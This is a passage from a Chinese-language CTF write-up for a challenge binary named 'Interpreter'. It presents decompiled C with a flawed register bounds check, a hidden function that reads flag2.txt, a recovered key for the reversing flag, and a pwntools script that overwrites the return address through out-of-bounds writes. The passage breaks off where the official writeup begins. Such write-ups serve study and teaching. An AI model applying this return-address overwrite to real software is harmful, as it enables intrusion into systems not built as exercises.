</div><p>在解析指令时有明显的逻辑漏洞，本意是只有0-3个寄存器，但是只要不都大于3就不会报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">currentIP</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="n">_reg2</span> <span class="o">=</span> <span class="n">currentIP</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">reg1</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">currentIP</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">opcode</span> <span class="o">==</span> <span class="sc">&#39;c&#39;</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">currentIP</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">v10</span> <span class="o">=</span> <span class="n">currentIP</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
      <span class="n">reg2</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">_reg2</span><span class="p">]</span> <span class="o">-</span> <span class="sc">&#39;0&#39;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">opcode</span> <span class="o">!=</span> <span class="sc">&#39;r&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">opcode</span> <span class="o">!=</span> <span class="sc">&#39;w&#39;</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">currentIP</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="n">reg3</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">v10</span><span class="p">]</span> <span class="o">-</span> <span class="sc">&#39;0&#39;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">currentIP</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">code</span><span class="p">[</span><span class="n">_reg2</span><span class="p">]</span> <span class="o">-</span> <span class="sc">&#39;0&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3u</span> <span class="o">&amp;&amp;</span> <span class="n">reg1</span> <span class="o">&gt;</span> <span class="mi">3u</span> <span class="o">&amp;&amp;</span> <span class="n">reg3</span> <span class="o">&gt;</span> <span class="mi">3u</span> <span class="p">)</span><span class="c1">// opcode &lt;=3 &lt;=3 &lt;=3
</span><span class="c1"></span>      <span class="p">{</span>                                         <span class="c1">// 逻辑漏洞
</span><span class="c1"></span>        <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cerr</span><span class="p">,</span> <span class="s">&#34;Invalid Register</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>所以能以v13为base，以任意一字节为offset，进行读写等操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main_core</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">code</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">code_len</span><span class="p">;</span> <span class="c1">// er15
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">reg3</span><span class="p">;</span> <span class="c1">// r13
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">reg2</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// cl
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">currentIP</span><span class="p">;</span> <span class="c1">// ebp
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">opcode</span><span class="p">;</span> <span class="c1">// al
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">_reg2</span><span class="p">;</span> <span class="c1">// esi
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">reg1</span><span class="p">;</span> <span class="c1">// bl
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// edi
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// edx
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-A0h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-98h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-60h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v16</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [rsp+50h] [rbp-58h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-40h]
</span></code></pre></td></tr></table>
</div>
</div><p>把v14改成3p1cl337-k3yw0rd就能拿到re的flag（flag1.txt）</p>
<p>pwn题要求拿到flag2.txt，在函数sub_2B47()，c++很难辨认，但是还是能依稀看出open了flag2.txt，并且该函数没有被任何函数调用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">sub_2B47</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rcx
</span><span class="c1"></span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rbp
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// si
</span><span class="c1"></span>  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-248h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-240h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-238h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-228h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-220h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-218h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v12</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+68h] [rbp-1E0h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v13</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [rsp+98h] [rbp-1B0h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span> <span class="c1">// [rsp+120h] [rbp-128h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+200h] [rbp-48h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [rsp+201h] [rbp-47h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// [rsp+208h] [rbp-40h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [rsp+210h] [rbp-38h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [rsp+218h] [rbp-30h]
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// [rsp+220h] [rbp-28h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// [rsp+228h] [rbp-20h]
</span><span class="c1"></span>
  <span class="n">v21</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">__ostream_insert</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34;Nice Job</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">9LL</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="n">ios_base</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">ios_base</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">);</span>
  <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4C40</span><span class="p">;</span>
  <span class="n">v14</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v17</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v18</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v19</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v20</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">dword_0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">**</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xFFFFFFFFFFFFFFE8</span><span class="p">])</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">dword_0</span><span class="p">;</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios</span><span class="o">::</span><span class="n">init</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v9</span> <span class="o">-</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4CE8</span><span class="p">;</span>
  <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4CE8</span> <span class="o">+</span> <span class="mi">40</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">filebuf</span><span class="o">::</span><span class="n">basic_filebuf</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="n">v11</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">std</span><span class="o">::</span><span class="n">filebuf</span><span class="o">::</span><span class="n">open</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="s">&#34;flag2.txt&#34;</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
    <span class="n">std</span><span class="o">::</span><span class="n">ios</span><span class="o">::</span><span class="n">clear</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v9</span> <span class="o">-</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">std</span><span class="o">::</span><span class="n">ios</span><span class="o">::</span><span class="n">clear</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v9</span> <span class="o">-</span> <span class="mi">3</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v9</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mi">4u</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v8</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&gt;&gt;&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">__ostream_insert</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34;Here&#39;s your second reward : &#34;</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="p">)</span><span class="n">std</span><span class="o">::</span><span class="n">__ostream_insert</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">-</span> <span class="mi">24LL</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">30</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v2</span> <span class="p">)</span>
    <span class="n">std</span><span class="o">::</span><span class="n">__throw_bad_cast</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span><span class="p">[</span><span class="mi">56</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">67</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">ctype</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;::</span><span class="n">_M_widen_init</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">30</span><span class="p">));</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">48LL</span><span class="p">))(</span><span class="n">v2</span><span class="p">,</span> <span class="mi">10LL</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="p">)</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">put</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">flush</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="n">v8</span> <span class="p">)</span>
    <span class="n">operator</span> <span class="n">delete</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">v8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4CE8</span><span class="p">;</span>
  <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4CE8</span> <span class="o">+</span> <span class="mi">40</span><span class="p">;</span>
  <span class="n">v11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4D30</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">filebuf</span><span class="o">::</span><span class="n">close</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">__basic_file</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;::~</span><span class="n">__basic_file</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
  <span class="n">v11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4C60</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">locale</span><span class="o">::~</span><span class="n">locale</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">locale</span> <span class="o">*</span><span class="p">)</span><span class="n">v12</span><span class="p">);</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">dword_0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">**</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v9</span> <span class="o">+</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xFFFFFFFFFFFFFFE8</span><span class="p">])</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">dword_0</span><span class="p">;</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4C40</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::~</span><span class="n">ios_base</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">ios_base</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v21</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>不管怎么样先执行到这个函数试试吧，考虑直接改返回地址。</p>
<p>改了，发现直接把flag打印出来了。。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="s2">&#34;&#34;&#34; x1do0 / Lilac &#34;&#34;&#34;</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./Interpreter&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getop</span><span class="p">(</span><span class="n">ch</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># 0x555555556b0c -&gt; 6B47</span>

<span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">code</span> <span class="o">+=</span> <span class="n">getop</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;000&#39;</span>  <span class="c1"># v13[0]=0</span>
<span class="n">code</span> <span class="o">+=</span> <span class="n">getop</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;040&#39;</span>  <span class="c1"># v13[0]=1</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0xc</span><span class="p">):</span>   <span class="c1"># v13[0xa8]+=0x47-0xc</span>
    <span class="n">code</span> <span class="o">+=</span> <span class="n">getop</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x80\x80</span><span class="s1">0&#39;</span>  

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter ur Code : &#34;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>官方writeup如下，这。。成功率50%我表示不能理解。。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
